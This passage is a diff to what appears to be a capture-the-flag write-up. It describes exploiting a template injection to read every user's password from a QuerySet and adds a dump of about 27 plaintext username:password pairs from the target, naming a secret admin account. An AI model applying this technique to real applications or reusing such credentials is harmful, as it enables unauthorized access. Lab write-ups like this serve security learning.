@@ -45,3 +45,33 @@ Response:
 <br>
 
 We can now traverse the users QuerySet to extract data for every single user, including their password, name, and email (e.g. <code class="language-none">{% raw %}{{ users.0.password }}{% endraw %}</code>). The goal here is to find the admin's secret account, because we can't interact on posts he didn't interact with and grab credentials that will get us SSH access. What we need to do is, iterate through the user indexes in our payload, trigger the SSTI by liking a post, and extract the data from the response (Essentially: Iterate through all users on your payload -> <code><b>GET</b> /like/{POST_ID}</code> -> <code><b>GET</b> /likes/{POST_ID}</code>).
+<br> <br>
+List of the users, <i>mikey</i> is the secret one.
+<pre><code class="language-none">glitch:Gl1tchH@ckz
+phreaker:Phre@k3rH@ck
+rootbreaker:R00tBr3@ker#
+shadowcaster:Sh@d0wC@st!
+shadowwalker:Sh@dowW@lk2024
+hexhunter:H3xHunt3r!
+zero_day:Zer0D@yH@ck
+trojanhorse:Tr0j@nH0rse!
+ringo:password
+cyberghost:Gh0stH@cker2024
+virus_viper:V!rusV!p3r2024
+netninja:N3tN1nj@2024
+datadive:D@taD1v3r
+test:Testest123#
+codebreaker:C0d3Br3@k!
+packetpirate:P@ck3tP!rat3
+stealth_hawk:St3@lthH@wk
+shadowmancer:Sh@d0wM@ncer
+mikey:mYd4rks1dEisH3re
+bytebandit:Byt3B@nd!t123
+blackhat_wolf:Bl@ckW0lfH@ck
+darkseeker:D@rkSeek3r#
+cryptoraven:CrYptoR@ven42
+brute_force:BrUt3F0rc3#
+exploit_wizard:Expl01tW!zard
+deepdive:D33pD!v3r
+whitehat:Wh!t3H@t2024
+</code></pre>
